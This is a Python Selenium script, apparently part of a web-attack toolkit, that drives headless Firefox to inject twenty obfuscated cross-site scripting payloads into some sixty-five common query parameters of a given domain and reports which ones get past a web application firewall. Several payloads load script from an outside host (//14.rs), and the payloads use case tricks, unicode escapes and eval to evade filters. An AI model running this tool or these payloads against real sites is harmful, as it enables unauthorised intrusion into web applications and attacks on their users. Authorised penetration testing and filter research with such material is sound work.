from selenium.webdriver.firefox.service import Service as FirefoxService
from selenium.webdriver.common.by import By
from selenium.webdriver.firefox.options import Options
from selenium import webdriver
from colorama import init, Fore, Style
import platform
import os


fg = Fore.GREEN
fr = Fore.RED
fw = Fore.WHITE
fy = Fore.YELLOW
fo = Fore.LIGHTYELLOW_EX
flc = Fore.CYAN
bd = Style.BRIGHT
res = Style.RESET_ALL

def test_waf_bypass(domain):
    payloads = [
        '\'"</Script><Html Onmouseover=(confirm)()//',
        '<imG/sRc=l oNerrOr=(prompt)() x>',
        '<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>',
        '<deTails open oNToggle=confi\u0072m()>',
        '<img sRc=l oNerrOr=(confirm)() x>',
        '<svg/x=">"/onload=confirm()//',
        '<svg%0Aonload=%09((pro\u006dpt))()//',
        '<iMg sRc=x:confirm`` oNlOad=e\u0076al(src)>',
        '<sCript x>confirm``</scRipt x>',
        '<Script x>prompt()</scRiPt x>',
        '<sCriPt sRc=//14.rs>',
        '<embed//sRc=//14.rs>',
        '<base href=//14.rs/><script src=/>',
        '<object//data=//14.rs>',
        '<s=" onclick=confirm``>clickme',
        '<svG oNLoad=co\u006efirm&#x28;1&#x29>',
        '\'"><y///oNMousEDown=((confirm))()>Click',
        '<a/href=javascript&colon;co\u006efirm&#40;&quot;1&quot;&#41;>clickme</a>',
        '<img src=x onerror=confir\u006d`1`>',
        '<svg/onload=co\u006efir\u006d`1`>'
    ]
    
    query_params = [
        "test", "id", "name", "search", "q", "query", "item", "category",
        "product", "page", "user", "username", "email", "login", "pass",
        "password", "type", "sort", "order", "filter", "view", "action",
        "cmd", "command", "module", "path", "file", "filename", "dir",
        "directory", "folder", "content", "data", "date", "time", "year",
        "month", "day", "event", "title", "description", "comment", "message",
        "post", "article", "news", "blog", "forum", "thread", "topic", "board",
        "section", "chapter", "pageid", "postid", "threadid", "articleid",
        "newsid", "blogid", "forumid", "topicid", "boardid", "sectionid",
        "chapterid"
    ]

    os_type = platform.system()
    if os_type == "Windows":
        geckodriver_path = os.path.join(os.path.dirname(__file__), 'geckodriver.exe')
    elif os_type in ["Linux", "Darwin"]:  # For both Linux and MacOS
        geckodriver_path = os.path.join(os.path.dirname(__file__), 'geckodriver')
    else:
        raise Exception(f"Unsupported OS: {os_type}")

    service = FirefoxService(executable_path=geckodriver_path)
    options = Options()
    options.headless = True

    driver = webdriver.Firefox(service=service, options=options)
    
    failed_attempts = 0

    try:
        for payload in payloads:
            for param in query_params:
                if failed_attempts >= 5:
                    print(f"{fy}{bd}[-] Stopping test after 5 failed attempts{res}")
                    return
                test_url = f"{domain}/?{param}={payload}"
                driver.get(test_url)
                if payload in driver.page_source:
                    print(f"{fg}{bd}[+] WAF bypassed with payload: {payload} on parameter: {param}{res}")
                    failed_attempts = 0  # Reset failed attempts if a payload is detected
                else:
                    print(f"{fr}{bd}[-] Payload not detected: {payload} on parameter: {param}{res}")
                    failed_attempts += 1
    except Exception as e:
        print(f"{fr}{bd}[-] Error testing WAF bypass: {e}{res}")
    finally:
        driver.quit()
